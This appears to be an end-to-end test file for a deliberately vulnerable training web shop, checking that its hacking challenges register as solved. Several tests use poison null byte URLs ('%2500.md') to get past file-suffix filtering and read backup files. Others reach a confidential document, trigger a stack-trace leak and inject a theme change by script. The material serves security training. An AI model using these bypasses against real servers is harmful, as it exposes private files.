'use strict';

describe('/ftp', function () {

    describe('challenge "confidentialDocument"', function () {

        it('should be able to access file /ftp/acquisitions.md', function () {
            browser.driver.get(browser.baseUrl + '/ftp/acquisitions.md');
        });

        protractor.expect.challengeSolved({challenge: 'confidentialDocument'});

    });

    describe('challenge "errorHandling"', function () {

        it('should leak information through error message accessing /ftp/easter.egg due to wrong file suffix', function () {
            browser.driver.get(browser.baseUrl + '/ftp/easter.egg');

            browser.driver.isElementPresent(by.id('stacktrace')).then(function(present){
                expect(present).toBe(true);
            });

            protractor.expect.challengeSolved({challenge: 'errorHandling'});

        });

    });

    describe('challenge "forgottenBackup"', function () {

        it('should be able to access file /ftp/package.json.bak with poison null byte attack', function () {
            browser.driver.get(browser.baseUrl + '/ftp/package.json.bak%2500.md');
        });

        it('should be able to access file /ftp/coupons_2013.md.bak with poison null byte attack', function () {
            browser.driver.get(browser.baseUrl + '/ftp/coupons_2013.md.bak%2500.pdf');
        });

        protractor.expect.challengeSolved({challenge: 'forgottenBackup'});

    });

    describe('challenge "easterEgg1"', function () {

        it('should be able to access file /ftp/easter.egg with poison null byte attack', function () {
            browser.driver.get(browser.baseUrl + '/ftp/eastere.gg%2500.md');
        });

        protractor.expect.challengeSolved({challenge: 'easterEgg1'});

    });

    describe('challenge "easterEgg2"', function () {

        it('should be able to access "secret" url for easter egg', function () {
            browser.driver.get(browser.baseUrl + '/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg');
        });

        protractor.expect.challengeSolved({challenge: 'easterEgg2'});

    });

    describe('challenge "geocitiesTheme"', function () {

        it('should be possible to change the CSS theme to geo-bootstrap', function () {

            browser.ignoreSynchronization = true;
            browser.executeScript('document.getElementById("theme").setAttribute("href", "css/geo-bootstrap/swatch/bootstrap.css");');
            browser.driver.sleep(2000);

            browser.get('/#/search');
            browser.driver.sleep(1000);
            browser.ignoreSynchronization = false;

        });

        protractor.expect.challengeSolved({challenge: 'geocitiesTheme'});

    });


});
